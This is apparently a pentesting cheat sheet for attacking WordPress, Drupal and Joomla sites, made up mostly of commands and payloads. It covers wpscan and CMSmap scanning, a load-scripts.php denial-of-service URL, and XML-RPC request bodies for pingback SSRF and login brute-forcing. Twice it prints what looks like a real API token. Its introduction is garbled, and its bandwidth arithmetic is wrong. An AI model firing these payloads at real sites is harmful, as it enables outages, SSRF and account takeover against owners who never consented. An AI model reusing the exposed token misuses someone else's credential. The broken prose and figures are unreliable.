
# WordPress, Drupal, Joomla - CMS (Content Management System)


## Introduction
An  WordPress vulnerability is a type of security flaw that  WordPress, Drupal, Joomla.
use WordPress , 
## Where to find
In  WordPress - CMS (Content Management System) useing wappalyzer extention analyse WordPress, Drupal, Joomla .

## How to exploit
## WpScan 
 How to use it :


 1.Basic 
 ```
wpscan --url https://example.com
```
2. enumerating all themes

```
wpscan --url https://example.com -e at
```
 3. enumerating all plugin

```
wpscan --url https://example.com -e ap
```
4.enumerating all vulnerable themes
```
wpscan --url https://example.com -e vt --api-token=LAusKwrzSuMtJucpp0QYjpSo2CiQohsnsC4ybxsGox0
```

5.enumerating all vulnerable plugin
```
wpscan --url https://example.com -e vp --api-token=LAusKwrzSuMtJucpp0QYjpSo2CiQohsnsC4ybxsGox0
```


## CMSmap
Wordpress, Drupal, Joomla

```
Installation:  
1.git clone https://github.com/Dionach/CMSmap
2.cd CMSmap
3.pip3 install .
```

Use:

```
cd CMSmap
sudo python3 cmsmap.py https://example.com

sudo python3 cmsmap.py https://example.com -f W
W - wordpress
D - drupal
J - joomla
```





## CMSscan
Installation:

```

1. git clone https://github.com/ajinabraham/CMSScan.git
2. cd CMSScan
3. sudo ./setup.sh
4. cd plugins
5. sudo nano scanners.py

```



now find 

```
wp_scan = ['wpscan', '--url', url, '--no-banner', '-f', 'json',
               '--force', '-e', 'vp,vt', '--plugins-detection',
               'mixed', '--rua']
here we have to add api key

wp_scan = ['wpscan', '--url', url, '--no-banner', '-f', 'json',
               '--force', '-e', 'vp,vt', '--plugins-detection',
               'mixed', '--rua', '--api-token=your_token_here']
CTRL+X, then Y and then Enter to save it.

```
Use: 

```

cd CMSScan
./run.sh
after running you will find a url in 2nd line

```



## Application Level DOS

```

https://example.com/wp-admin/load-scripts.php?load=react,react-dom,moment,lodash,wp-polyfill-fetch,wp-polyfill-formdata,wp-polyfill-node-contains,wp-polyfill-url,wp-polyfill-dom-rect,wp-polyfill-element-closest,wp-polyfill,wp-block-library,wp-edit-post,wp-i18n,wp-hooks,wp-api-fetch,wp-data,wp-date,editor,colorpicker,media,wplink,link,utils,common,wp-sanitize,sack,quicktags,clipboard,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-reply,json2,underscore,backbone,wp-util,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrate,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,esprima,jshint,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-bar,wplink,wpdialogs,word-count,media-upload,hoverIntent,hoverintent-js,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embed,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,site-health,privacy-tools,updates,farbtastic,iris,wp-color-picker,dashboard,list-revisions,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter

```

4.19MB
suppose 10000*4.19=419000MB == 42GB


## XMLRPC

```
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>

```

1. SSRF -------> pingback.ping


```
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>Host</string></value>
</param><param><value><string>Some Valid Post Link</string>
</value></param></params>
</methodCall>

```
2. Brute-force --------> wp.getUsersBlogs
```

<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>username</value></param>
<param><value>password</value></param>
</params>
</methodCall>


```
